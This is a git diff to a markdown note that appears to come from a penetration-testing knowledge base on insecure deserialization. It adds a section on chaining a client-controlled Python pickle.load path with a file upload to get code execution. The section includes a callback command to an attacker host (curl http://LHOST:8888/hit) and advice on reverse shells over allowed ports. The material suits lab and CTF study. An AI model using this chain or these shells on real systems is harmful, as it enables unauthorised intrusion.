@@ -4,7 +4,7 @@ type: technique
 tags: [0xdf, deserialization, exploitation, gadget-chain, h1, htb, phar, php, portswigger, rce, thm, web, jndi, pickle]
 phase: exploitation
 date_created: 2026-05-08
-date_updated: 2026-06-18
+date_updated: 2026-07-23
 sources: [thm-adv-deserial, h1-scraped-deserialization, 0xdf-deserialization, payloadsallthethings-insecure-deserialization, git-payloadsallthethings, git-portswigger-all-labs]
 
 ---
@@ -311,6 +311,29 @@ print(base64.b64encode(pickle.dumps(Exploit())).decode())
 ```
 
 Replace the `serialized_data` field in the target application's POST request with this value.
+
+### Python Pickle: path-controlled `pickle.load` + separate upload = RCE (delivery chain)
+
+A recurring shape where neither half looks like RCE alone: an endpoint deserializes a file whose PATH
+the client supplies, and a SEPARATE feature writes an arbitrary file to disk.
+
+- **The sink:** a JSON route like `POST /fetch` with body `{"object": "/server/path.pkl"}` that runs
+  `pickle.load(open(object))` and returns the object. The path is client-controlled, so it loads ANY
+  file you name (pointing it at a non-pickle path 500s, which confirms it opens the given path). The
+  endpoint and its default object paths usually live in a front-end JS handler (`onclick` -> AJAX);
+  READ the JS end-to-end, because a keyword grep skips the handler that reveals it.
+- **The delivery:** any upload that lands your file somewhere the app can read. Uploaded files are
+  frequently NOT reachable by URL (stored outside the web root) - that is fine; the upload is only a
+  DELIVERY primitive for the loader, not a webshell, so do not rabbit-hole hunting the file over HTTP.
+- **Chain:** craft a `__reduce__` pickle (see the `__reduce__` section above) -> upload it -> POST
+  the loader with the file's on-disk path -> code runs as the app user. Build the pickle with the
+  target's Python major version.
+- **Blind / egress gotcha:** if a reverse shell will not connect, the box may allow only http-ish
+  outbound. Prove code-exec AND egress with an HTTP callback first (`curl http://LHOST:8888/hit`),
+  then reverse-shell over a port that is actually allowed out (often 443 or 80); use a python reverse
+  shell if the target `bash` lacks `/dev/tcp`.
+
+<!-- promoted-slug: pickle-path-load-chain -->
 
 ### Node.js: node-serialize
 
